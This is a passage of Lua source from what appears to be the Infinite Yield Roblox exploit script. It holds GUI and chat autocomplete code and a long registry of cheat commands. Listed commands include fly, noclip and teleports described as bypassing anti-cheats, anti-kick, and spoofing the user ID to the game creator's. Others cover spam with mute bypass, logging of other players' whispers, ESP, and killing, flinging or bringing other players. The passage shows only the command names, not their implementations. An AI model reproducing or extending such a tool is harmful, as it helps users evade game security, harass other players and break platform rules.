					game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
					local Position2 = UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
				end
			end
			dragpoint.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
			dragpoint.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end)
	end

	dragMain(Title,Holder)

	Match = function(name,str)
		str = str:gsub("%W", "%%%1")
		return name:lower():find(str:lower()) and true
	end

	local canvasPos = Vector2.new(0,0)
	local topCommand = nil
	IndexContents = function(str,bool,cmdbar,Ianim)
		local SizeY = 0
		local indexnum = 0
		local frame = CMDsF
		topCommand = nil
		local chunks = {}
		if str:sub(#str,#str) == "\\" then str = "" end
		for w in string.gmatch(str,"[^\\]+") do
			table.insert(chunks,w)
		end
		if #chunks > 0 then str = chunks[#chunks] end
		if str:sub(1,1) == "!" then str = str:sub(2) end
		for i,v in next, frame:GetChildren() do
			if v:IsA("TextButton") then
				if bool then
					if Match(v.Text,str) then
						indexnum = indexnum + 1
						v.Visible = true
						if topCommand == nil then
							topCommand = v.Text
						end
					else
						v.Visible = false
					end
				else
					v.Visible = true
					if topCommand == nil then
						topCommand = v.Text
					end
				end
			end
		end
		frame.CanvasSize = UDim2.new(0,0,0,cmdListLayout.AbsoluteContentSize.Y)
		if not Ianim then
			if indexnum == 0 or string.find(str, " ") then
				if not cmdbar then
					minimizeHolder()
				elseif cmdbar then
					cmdbarHolder()
				end
			else
				maximizeHolder()
			end
		else
			minimizeHolder()
		end
	end

	PlayerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
	local chatbox
	spawn(function()
		if pcall(function() chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar end) then	
			local function chatboxFocused()
				canvasPos = CMDsF.CanvasPosition
			end
			local chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)

			local function Index()
				if chatbox.Text:lower():sub(1,1) == prefix then
					if SettingsOpen == true then
						wait(0.2)
						CMDsF.Visible = true
						Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
					end
					IndexContents(PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar.Text:lower():sub(2),true)
				else
					minimizeHolder()
					if SettingsOpen == true then
						wait(0.2)
						Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
						CMDsF.Visible = false
					end
				end
			end
			local chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)

			function chatboxFocusLost(enterpressed)
				if not enterpressed or chatbox.Text:lower():sub(1,1) ~= prefix then
					IndexContents('',true)
				end
				CMDsF.CanvasPosition = canvasPos
				minimizeHolder()
			end
			local chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)

			PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.ChildAdded:Connect(function(newbar)
				wait()
				if newbar:FindFirstChild('BoxFrame') then
					chatbox = PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
					if chatboxFocusedC then chatboxFocusedC:Disconnect() end
					chatboxFocusedC = chatbox.Focused:Connect(chatboxFocused)
					if chatboxFunc then chatboxFunc:Disconnect() end
					chatboxFunc = chatbox:GetPropertyChangedSignal("Text"):Connect(Index)
					if chatboxFocusLostC then chatboxFocusLostC:Disconnect() end
					chatboxFocusLostC = chatbox.FocusLost:Connect(chatboxFocusLost)
				end
			end)
			--else
			--print('Custom chat detected. Will not provide suggestions for commands typed in the chat.')
		end
	end)

	function autoComplete(str,curText)
		local endingChar = {"[", "/", "(", " "}
		local stop = 0
		for i=1,#str do
			local c = str:sub(i,i)
			if table.find(endingChar, c) then
				stop = i
				break
			end
		end
		curText = curText or Cmdbar.Text
		local subPos = 0
		local pos = 1
		local findRes = string.find(curText,"\\",pos)
		while findRes do
			subPos = findRes
			pos = findRes+1
			findRes = string.find(curText,"\\",pos)
		end
		if curText:sub(subPos+1,subPos+1) == "!" then subPos = subPos + 1 end
		Cmdbar.Text = curText:sub(1,subPos) .. str:sub(1, stop - 1)..' '
		wait()
		Cmdbar.Text = Cmdbar.Text:gsub( '\t', '' )
		Cmdbar.CursorPosition = #Cmdbar.Text+1--1020
	end

	CMDs = {}
	CMDs[#CMDs + 1] = {NAME = 'console', DESC = 'Loads old Roblox console'}
	CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX explorer'}
	CMDs[#CMDs + 1] = {NAME = 'remotespy / rspy', DESC = 'Opens FrostHook Spy'}
	CMDs[#CMDs + 1] = {NAME = 'audiologger / alogger', DESC = 'Opens Edges audio logger'}
	CMDs[#CMDs + 1] = {NAME = 'serverinfo / info', DESC = 'Gives you info about the server'}
	CMDs[#CMDs + 1] = {NAME = 'jobid', DESC = 'Copies the games JobId to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'notifyjobid', DESC = 'Notifies you the games JobId'}
	CMDs[#CMDs + 1] = {NAME = 'rejoin / rj', DESC = 'Makes you rejoin the game'}
	CMDs[#CMDs + 1] = {NAME = 'autorejoin / autorj', DESC = 'Automatically rejoins the server if you get kicked/disconnected'}
	CMDs[#CMDs + 1] = {NAME = 'serverhop / shop', DESC = 'Teleports you to a different server'}
	CMDs[#CMDs + 1] = {NAME = 'joinplayer [username / ID] [place ID]', DESC = 'Joins a specific players server'}
	CMDs[#CMDs + 1] = {NAME = 'gameteleport / gametp [place ID]', DESC = 'Joins a game by ID'}
	CMDs[#CMDs + 1] = {NAME = 'antiidle / antiafk', DESC = 'Prevents the game from kicking you for being idle/afk'}
	CMDs[#CMDs + 1] = {NAME = 'datalimit [num]', DESC = 'Set outgoing KBPS limit'}
	CMDs[#CMDs + 1] = {NAME = 'replicationlag / backtrack [num]', DESC = 'Set IncomingReplicationLag'}
	CMDs[#CMDs + 1] = {NAME = 'creatorid / creator', DESC = 'Notifies you the creators ID'}
	CMDs[#CMDs + 1] = {NAME = 'copycreatorid / copycreator', DESC = 'Copies the creators ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'setcreatorid / setcreator', DESC = 'Sets your userid to the creators ID'}
	CMDs[#CMDs + 1] = {NAME = 'noprompts', DESC = 'Prevents the game from showing you purchase/premium prompts'}
	CMDs[#CMDs + 1] = {NAME = 'showprompts', DESC = 'Allows the game to show purchase/premium prompts again'}
	CMDs[#CMDs + 1] = {NAME = 'enable [inventory/playerlist/chat/all]', DESC = 'Toggles visibility of coregui items'}
	CMDs[#CMDs + 1] = {NAME = 'disable [inventory/playerlist/chat/all]', DESC = 'Toggles visibility of coregui items'}
	CMDs[#CMDs + 1] = {NAME = 'showguis', DESC = 'Shows any invisible GUIs'}
	CMDs[#CMDs + 1] = {NAME = 'unshowguis', DESC = 'Undoes showguis'}
	CMDs[#CMDs + 1] = {NAME = 'hideguis', DESC = 'Hides any GUIs in PlayerGui'}
	CMDs[#CMDs + 1] = {NAME = 'unhideguis', DESC = 'Undoes hideguis'}
	CMDs[#CMDs + 1] = {NAME = 'guidelete', DESC = 'Enables backspace to delete GUI'}
	CMDs[#CMDs + 1] = {NAME = 'unguidelete / noguidelete', DESC = 'Disables guidelete'}
	CMDs[#CMDs + 1] = {NAME = 'hideiy', DESC = 'Hides the main IY GUI'}
	CMDs[#CMDs + 1] = {NAME = 'showiy', DESC = 'Shows IY again'}
	CMDs[#CMDs + 1] = {NAME = 'savegame / saveplace', DESC = 'Uses saveinstance to save the game'}
	CMDs[#CMDs + 1] = {NAME = 'clearerror', DESC = 'Clears the annoying box and blur when a game kicks you'}
	CMDs[#CMDs + 1] = {NAME = 'clientantikick / antikick (CLIENT)', DESC = 'Prevents localscripts from kicking you'}
	CMDs[#CMDs + 1] = {NAME = 'clientantiteleport / antiteleport (CLIENT)', DESC = 'Prevents localscripts from teleporting you'}
	CMDs[#CMDs + 1] = {NAME = 'allowrejoin / allowrj [true/false] (CLIENT)', DESC = 'Changes if antiteleport allows you to rejoin or not'}
	CMDs[#CMDs + 1] = {NAME = 'cancelteleport / canceltp', DESC = 'Cancels teleports in progress'}
	CMDs[#CMDs + 1] = {NAME = 'volume / vol [0-10]', DESC = 'Adjusts your game volume on a scale of 0 to 10'}
	CMDs[#CMDs + 1] = {NAME = 'antilag / boostfps / lowgraphics', DESC = 'Lowers game quality to boost FPS'}
	CMDs[#CMDs + 1] = {NAME = 'record / rec', DESC = 'Starts roblox recorder'}
	CMDs[#CMDs + 1] = {NAME = 'screenshot / scrnshot', DESC = 'Takes a screenshot'}
	CMDs[#CMDs + 1] = {NAME = 'togglefullscreen / togglefs', DESC = 'Toggles fullscreen'}
	CMDs[#CMDs + 1] = {NAME = 'notify [text]', DESC = 'Sends you a notification with the provided text'}
	CMDs[#CMDs + 1] = {NAME = 'lastcommand / lastcmd', DESC = 'Executes the previous command used'}
	CMDs[#CMDs + 1] = {NAME = 'exit', DESC = 'Kills roblox process'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
	CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
	CMDs[#CMDs + 1] = {NAME = 'fly [speed]', DESC = 'Makes you fly'}
	CMDs[#CMDs + 1] = {NAME = 'unfly', DESC = 'Disables fly'}
	CMDs[#CMDs + 1] = {NAME = 'flyspeed [num]', DESC = 'Set fly speed (default is 20)'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclefly / vfly [speed]', DESC = 'Makes you fly in a vehicle'}
	CMDs[#CMDs + 1] = {NAME = 'unvehiclefly / unvfly', DESC = 'Disables vehicle fly'}
	CMDs[#CMDs + 1] = {NAME = 'vehicleflyspeed  / vflyspeed [num]', DESC = 'Set vehicle fly speed'}
	CMDs[#CMDs + 1] = {NAME = 'cframefly / cfly [speed]', DESC = 'Makes you fly, bypassing some anti cheats'}
	CMDs[#CMDs + 1] = {NAME = 'uncframefly / uncfly', DESC = 'Disables cfly'}
	CMDs[#CMDs + 1] = {NAME = 'cframeflyspeed  / cflyspeed [num]', DESC = 'Sets cfly speed'}
	CMDs[#CMDs + 1] = {NAME = 'qefly [true / false]', DESC = 'enables or disables the Q and E hotkeys for fly'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclenoclip / vnoclip', DESC = 'Turns off vehicle collision'}
	CMDs[#CMDs + 1] = {NAME = 'vehicleclip / vclip / unvnoclip', DESC = 'Enables vehicle collision'}
	CMDs[#CMDs + 1] = {NAME = 'float /  platform', DESC = 'Spawns a platform beneath you causing you to float'}
	CMDs[#CMDs + 1] = {NAME = 'unfloat / noplatform', DESC = 'Removes the platform'}
	CMDs[#CMDs + 1] = {NAME = 'swim', DESC = 'Allows you to swim in the air'}
	CMDs[#CMDs + 1] = {NAME = 'unswim / noswim', DESC = 'Stops you from swimming everywhere'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'setwaypoint / swp [name]', DESC = 'Sets a waypoint at your position'}
	CMDs[#CMDs + 1] = {NAME = 'waypointpos / wpp [name] [X Y Z]', DESC = 'Sets a waypoint with specified coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'showwaypoints / showwp', DESC = 'Shows all currently set waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'hidewaypoints / hidewp', DESC = 'Hides shown waypoints'}
	CMDs[#CMDs + 1] = {NAME = 'waypoint / wp [name]', DESC = 'Teleports player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'tweenwaypoint / twp [name]', DESC = 'Tweens player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'walktowaypoint / wtwp [name]', DESC = 'Walks player to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'deletewaypoint / dwp [name]', DESC = 'Deletes a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'clearwaypoints / cwp', DESC = 'Clears all waypoints'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'goto [plr]', DESC = 'Go to a player'}
	CMDs[#CMDs + 1] = {NAME = 'tweengoto / tgoto [plr]', DESC = 'Tween to a player (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'tweenspeed / tspeed [num]', DESC = 'Sets how fast all tween commands go (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'vehiclegoto / vgoto [plr]', DESC = 'Go to a player while in a vehicle'}
	CMDs[#CMDs + 1] = {NAME = 'loopgoto [plr] [distance] [delay]', DESC = 'Loop teleport to a player'}
	CMDs[#CMDs + 1] = {NAME = 'unloopgoto', DESC = 'Stops teleporting you to a player'}
	CMDs[#CMDs + 1] = {NAME = 'clientbring / cbring [plr] (CLIENT)', DESC = 'Bring a player'}
	CMDs[#CMDs + 1] = {NAME = 'loopbring [plr] [distance] [delay] (CLIENT)', DESC = 'Loop brings a player to you (useful for killing)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopbring [plr]', DESC = 'Undoes loopbring'}
	CMDs[#CMDs + 1] = {NAME = 'freeze / fr [plr] (CLIENT)', DESC = 'Freezes a player'}
	CMDs[#CMDs + 1] = {NAME = 'thaw / unfr [plr] (CLIENT)', DESC = 'Unfreezes a player'}
	CMDs[#CMDs + 1] = {NAME = 'tpposition / tppos [X Y Z]', DESC = 'Teleports you to certain coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'tweentpposition / ttppos [X Y Z]', DESC = 'Tween to coordinates (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'offset [X Y Z]', DESC = 'Offsets you by certain coordinates'}
	CMDs[#CMDs + 1] = {NAME = 'tweenoffset / toffset [X Y Z]', DESC = 'Tween offset (bypasses some anti cheats)'}
	CMDs[#CMDs + 1] = {NAME = 'notifyposition / notifypos [plr]', DESC = 'Notifies you the coordinates of a character'}
	CMDs[#CMDs + 1] = {NAME = 'copyposition / copypos [plr]', DESC = 'Copies the coordinates of a character to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'walktoposition / walktopos [X Y Z]', DESC = 'Makes you walk to a coordinate'}
	CMDs[#CMDs + 1] = {NAME = 'spawnpoint / spawn [delay]', DESC = 'Sets a position where you will spawn'}
	CMDs[#CMDs + 1] = {NAME = 'nospawnpoint / nospawn', DESC = 'Removes your custom spawn point'}
	CMDs[#CMDs + 1] = {NAME = 'flashback / diedtp', DESC = 'Teleports you to where you last died'}
	CMDs[#CMDs + 1] = {NAME = 'walltp', DESC = 'Teleports you above/over any wall you run into'}
	CMDs[#CMDs + 1] = {NAME = 'nowalltp / unwalltp', DESC = 'Disables walltp'}
	CMDs[#CMDs + 1] = {NAME = 'teleporttool / tptool', DESC = 'Gives you a teleport tool'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'logs', DESC = 'Opens the logs GUI'}
	CMDs[#CMDs + 1] = {NAME = 'chatlogs / clogs', DESC = 'Log what people say or whisper'}
	CMDs[#CMDs + 1] = {NAME = 'joinlogs / jlogs', DESC = 'Log when people join'}
	CMDs[#CMDs + 1] = {NAME = 'chat / say [text]', DESC = 'Makes you chat a string (possible mute bypass)'}
	CMDs[#CMDs + 1] = {NAME = 'spam [text]', DESC = 'Makes you spam the chat'}
	CMDs[#CMDs + 1] = {NAME = 'unspam', DESC = 'Turns off spam'}
	CMDs[#CMDs + 1] = {NAME = 'whisper / pm [plr] [text]', DESC = 'Makes you whisper a string to someone (possible mute bypass)'}
	CMDs[#CMDs + 1] = {NAME = 'pmspam [plr] [text]', DESC = 'Makes you spam a players whispers'}
	CMDs[#CMDs + 1] = {NAME = 'unpmspam [plr]', DESC = 'Turns off pm spam'}
	CMDs[#CMDs + 1] = {NAME = 'spamspeed [num]', DESC = 'How quickly you spam (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'bubblechat (CLIENT)', DESC = 'Enables bubble chat for your client'}
	CMDs[#CMDs + 1] = {NAME = 'unbubblechat / nobubblechat', DESC = 'Disables the bubblechat command'}
	CMDs[#CMDs + 1] = {NAME = 'safechat', DESC = 'Enables safe chat'}
	CMDs[#CMDs + 1] = {NAME = 'nosafechat / disablesafechat', DESC = 'Disables safechat'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'esp', DESC = 'View all players and their status'}
	CMDs[#CMDs + 1] = {NAME = 'noesp / unesp', DESC = 'Removes esp'}
	CMDs[#CMDs + 1] = {NAME = 'partesp [part name]', DESC = 'Highlights a part'}
	CMDs[#CMDs + 1] = {NAME = 'unpartesp / nopartesp [part name]', DESC = 'removes partesp'}
	CMDs[#CMDs + 1] = {NAME = 'chams', DESC = 'ESP but without text in the way'}
	CMDs[#CMDs + 1] = {NAME = 'nochams / unchams', DESC = 'Removes chams'}
	CMDs[#CMDs + 1] = {NAME = 'locate [plr]', DESC = 'View a single player and their status'}
	CMDs[#CMDs + 1] = {NAME = 'unlocate / nolocate [plr]', DESC = 'Removes locate'}
	CMDs[#CMDs + 1] = {NAME = 'xray', DESC = 'Makes all parts in workspace transparent'}
	CMDs[#CMDs + 1] = {NAME = 'unxray / noxray', DESC = 'Restores transparency'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'spectate / view [plr]', DESC = 'View a player'}
	CMDs[#CMDs + 1] = {NAME = 'viewpart / viewp [part name]', DESC = 'View a part'}
	CMDs[#CMDs + 1] = {NAME = 'unspectate / unview', DESC = 'Stops viewing player'}
	CMDs[#CMDs + 1] = {NAME = 'freecam / fc', DESC = 'Allows you to freely move camera around the game'}
	CMDs[#CMDs + 1] = {NAME = 'freecampos / fcpos [X Y Z]', DESC = 'Moves / opens freecam in a certain position'}
	CMDs[#CMDs + 1] = {NAME = 'freecamwaypoint / fcwp [name]', DESC = 'Moves / opens freecam to a waypoint'}
	CMDs[#CMDs + 1] = {NAME = 'freecamgoto / fcgoto / fctp [plr]', DESC = 'Moves / opens freecam to a player'}
	CMDs[#CMDs + 1] = {NAME = 'unfreecam / unfc', DESC = 'Disables freecam'}
	CMDs[#CMDs + 1] = {NAME = 'freecamspeed / fcspeed [num]', DESC = 'Adjusts freecam speed (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'gotocamera / gotocam', DESC = 'Teleports you to the location of your camera'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotocam / tgotocam', DESC = 'Tweens you to the location of your camera'}
	CMDs[#CMDs + 1] = {NAME = 'firstp', DESC = 'Forces camera to go into first person'}
	CMDs[#CMDs + 1] = {NAME = 'thirdp', DESC = 'Allows camera to go into third person'}
	CMDs[#CMDs + 1] = {NAME = 'noclipcam / nccam', DESC = 'Allows camera to go through objects like walls'}
	CMDs[#CMDs + 1] = {NAME = 'maxzoom [num]', DESC = 'Maximum camera zoom'}
	CMDs[#CMDs + 1] = {NAME = 'minzoom [num]', DESC = 'Minimum camera zoom'}
	CMDs[#CMDs + 1] = {NAME = 'fov [num]', DESC = 'Adjusts field of view (default is 70)'}
	CMDs[#CMDs + 1] = {NAME = 'fixcam / restorecam', DESC = 'Fixes camera'}
	CMDs[#CMDs + 1] = {NAME = 'enableshiftlock / enablesl', DESC = 'Enables the shift lock option'}
	CMDs[#CMDs + 1] = {NAME = 'lookat [plr]', DESC = 'Moves your camera view to a player'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'btools (CLIENT)', DESC = 'Gives you building tools (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'f3x (CLIENT)', DESC = 'Gives you F3X building tools (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'partname / partpath', DESC = 'Allows you to click a part to see its path & name'}
	CMDs[#CMDs + 1] = {NAME = 'delete [instance name] (CLIENT)', DESC = 'Removes any part with a certain name from the workspace (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'deleteclass / dc [class name] (CLIENT)', DESC = 'Removes any part with a certain classname from the workspace (DOES NOT REPLICATE)'}
	CMDs[#CMDs + 1] = {NAME = 'lockworkspace / lockws', DESC = 'Locks the whole workspace'}
	CMDs[#CMDs + 1] = {NAME = 'unlockworkspace / unlockws', DESC = 'Unlocks the whole workspace'}
	CMDs[#CMDs + 1] = {NAME = 'invisibleparts / invisparts (CLIENT)', DESC = 'Shows invisible parts'}
	CMDs[#CMDs + 1] = {NAME = 'uninvisibleparts / uninvisparts (CLIENT)', DESC = 'Makes parts affected by invisparts return to normal'}
	CMDs[#CMDs + 1] = {NAME = 'deleteinvisparts / dip (CLIENT)', DESC = 'Deletes invisible parts'}
	CMDs[#CMDs + 1] = {NAME = 'gotopart [part name]', DESC = 'Moves your character to a part or multiple parts'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotopart / tgotopart [part name]', DESC = 'Tweens your character to a part or multiple parts'}
	CMDs[#CMDs + 1] = {NAME = 'gotopartclass / gpc [class name]', DESC = 'Moves your character to a part or multiple parts based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotopartclass / tgpc [class name]', DESC = 'Tweens your character to a part or multiple parts based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'gotomodel [part name]', DESC = 'Moves your character to a model or multiple models'}
	CMDs[#CMDs + 1] = {NAME = 'tweengotomodel / tgotomodel [part name]', DESC = 'Tweens your character to a model or multiple models'}
	CMDs[#CMDs + 1] = {NAME = 'gotopartdelay / gotomodeldelay [num]', DESC = 'Adjusts how quickly you teleport to each part (default is 0.1)'}
	CMDs[#CMDs + 1] = {NAME = 'bringpart [part name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character'}
	CMDs[#CMDs + 1] = {NAME = 'bringpartclass / bpc [class name] (CLIENT)', DESC = 'Moves a part or multiple parts to your character based on classname'}
	CMDs[#CMDs + 1] = {NAME = 'noclickdetectorlimits / nocdlimits', DESC = 'Sets all click detectors MaxActivationDistance to math.huge'}
	CMDs[#CMDs + 1] = {NAME = 'fireclickdetectors / firecd', DESC = 'Uses all click detectors in a game'}
	CMDs[#CMDs + 1] = {NAME = 'firetouchinterests / touchinterests', DESC = 'Uses all touchinterests in a game'}
	CMDs[#CMDs + 1] = {NAME = 'simulationradius / simradius', DESC = 'Sets your SimulationRadius to math.huge'}
	CMDs[#CMDs + 1] = {NAME = 'nosimulationradius / nosimradius', DESC = 'Turns off the SimulationRadius loop and restores values to default'}
	CMDs[#CMDs + 1] = {NAME = 'tpunanchored / tpua [plr]', DESC = 'Teleports unanchored parts to a player'}
	CMDs[#CMDs + 1] = {NAME = 'freezeunanchored / freezeua', DESC = 'Freezes unanchored parts'}
	CMDs[#CMDs + 1] = {NAME = 'thawunanchored / thawua / unfreezeua', DESC = 'Thaws unanchored parts'}
	CMDs[#CMDs + 1] = {NAME = 'removeterrain / rterrain / noterrain', DESC = 'Removes all terrain'}
	CMDs[#CMDs + 1] = {NAME = 'clearnilinstances / nonilinstances / cni', DESC = 'Removes nil instances'}
	CMDs[#CMDs + 1] = {NAME = 'destroyheight / dh [num]', DESC = 'Sets FallenPartsDestroyHeight'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'fullbright / fb (CLIENT)', DESC = 'Makes the map brighter / more visible'}
	CMDs[#CMDs + 1] = {NAME = 'loopfullbright / loopfb (CLIENT)', DESC = 'Makes the map brighter / more visible but looped'}
	CMDs[#CMDs + 1] = {NAME = 'ambient [num] [num] [num] (CLIENT)', DESC = 'Changes ambient'}
	CMDs[#CMDs + 1] = {NAME = 'day (CLIENT)', DESC = 'Changes the time to day for the client'}
	CMDs[#CMDs + 1] = {NAME = 'night (CLIENT)', DESC = 'Changes the time to night for the client'}
	CMDs[#CMDs + 1] = {NAME = 'nofog (CLIENT)', DESC = 'Removes fog'}
	CMDs[#CMDs + 1] = {NAME = 'brightness [num] (CLIENT)', DESC = 'Changes the brightness lighting property'}
	CMDs[#CMDs + 1] = {NAME = 'globalshadows / gshadows (CLIENT)', DESC = 'Enables global shadows'}
	CMDs[#CMDs + 1] = {NAME = 'noglobalshadows / nogshadows (CLIENT)', DESC = 'Disables global shadows'}
	CMDs[#CMDs + 1] = {NAME = 'restorelighting / rlighting', DESC = 'Restores Lighting properties'}
	CMDs[#CMDs + 1] = {NAME = 'light [radius] [brightness] (CLIENT)', DESC = 'Gives your player dynamic light'}
	CMDs[#CMDs + 1] = {NAME = 'nolight / unlight', DESC = 'Removes dynamic light from your player'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'inspect / examine [plr]', DESC = 'Opens InspectMenu for a certain player'}
	CMDs[#CMDs + 1] = {NAME = 'age [plr]', DESC = 'Tells you the age of a player'}
	CMDs[#CMDs + 1] = {NAME = 'chatage [plr]', DESC = 'Chats the age of a player'}
	CMDs[#CMDs + 1] = {NAME = 'joindate / jd [plr]', DESC = 'Tells you the date the player joined Roblox'}
	CMDs[#CMDs + 1] = {NAME = 'chatjoindate / cjd [plr]', DESC = 'Chats the date the player joined Roblox'}
	CMDs[#CMDs + 1] = {NAME = 'copyname / copyuser [plr]', DESC = 'Copies a players full username to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'userid / id [plr]', DESC = 'Notifies a players user ID'}
	CMDs[#CMDs + 1] = {NAME = 'copyuserid / copyid [plr]', DESC = 'Copies a players user ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'appearanceid / aid [plr]', DESC = 'Notifies a players appearance ID'}
	CMDs[#CMDs + 1] = {NAME = 'copyappearanceid / caid [plr]', DESC = 'Copies a players appearance ID to your clipboard'}
	CMDs[#CMDs + 1] = {NAME = 'bang [plr] [speed]', DESC = 'owo'}
	CMDs[#CMDs + 1] = {NAME = 'unbang', DESC = 'uwu'}
	CMDs[#CMDs + 1] = {NAME = 'carpet [plr]', DESC = 'Be someones carpet'}
	CMDs[#CMDs + 1] = {NAME = 'uncarpet', DESC = 'Undoes carpet'}
	CMDs[#CMDs + 1] = {NAME = 'friend [plr]', DESC = 'Sends a friend request to certain players'}
	CMDs[#CMDs + 1] = {NAME = 'unfriend [plr]', DESC = 'Unfriends certain players'}
	CMDs[#CMDs + 1] = {NAME = 'headsit [plr]', DESC = 'Sit on a players head'}
	CMDs[#CMDs + 1] = {NAME = 'walkto / follow [plr]', DESC = 'Follow a player'}
	CMDs[#CMDs + 1] = {NAME = 'pathfindwalkto / pathfindfollow [plr]', DESC = 'Follow a player using pathfinding'}
	CMDs[#CMDs + 1] = {NAME = 'unwalkto / unfollow', DESC = 'Stops following a player'}
	CMDs[#CMDs + 1] = {NAME = 'stareat / stare [plr]', DESC = 'Stare / look at a player'}
	CMDs[#CMDs + 1] = {NAME = 'unstareat / unstare [plr]', DESC = 'Disables stareat'}
	CMDs[#CMDs + 1] = {NAME = 'attach [plr] (TOOL)', DESC = 'Attaches you to a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'kill [plr] (TOOL)', DESC = 'Kills a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastkill [plr] (TOOL)', DESC = 'Kills a player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'handlekill / hkill [plr] (TOOL)', DESC = 'Kills a player using tool damage (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'bring [plr] (TOOL)', DESC = 'Brings a player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastbring [plr] (TOOL)', DESC = 'Brings a player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'teleport / tp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fastteleport / fasttp [plr] [plr] (TOOL)', DESC = 'Teleports a player to another player (less reliable) (YOU NEED A TOOL)'}
	CMDs[#CMDs + 1] = {NAME = 'fling', DESC = 'Flings anyone you touch'}
	CMDs[#CMDs + 1] = {NAME = 'unfling', DESC = 'Disables the fling command'}
	CMDs[#CMDs + 1] = {NAME = 'invisfling', DESC = 'Enables invisible fling'}
	CMDs[#CMDs + 1] = {NAME = 'loopoof', DESC = 'Loops everyones character sounds (everyone can hear)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
	CMDs[#CMDs + 1] = {NAME = 'muteboombox [plr]', DESC = 'Mutes someones boombox'}
	CMDs[#CMDs + 1] = {NAME = 'unmuteboombox [plr]', DESC = 'Unmutes someones boombox'}
	CMDs[#CMDs + 1] = {NAME = 'unloopoof', DESC = 'Stops the oof chaos'}
	CMDs[#CMDs + 1] = {NAME = 'hitbox [plr] [size]', DESC = 'Expands the hitbox for players heads (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'reset', DESC = 'Resets your character normally'}
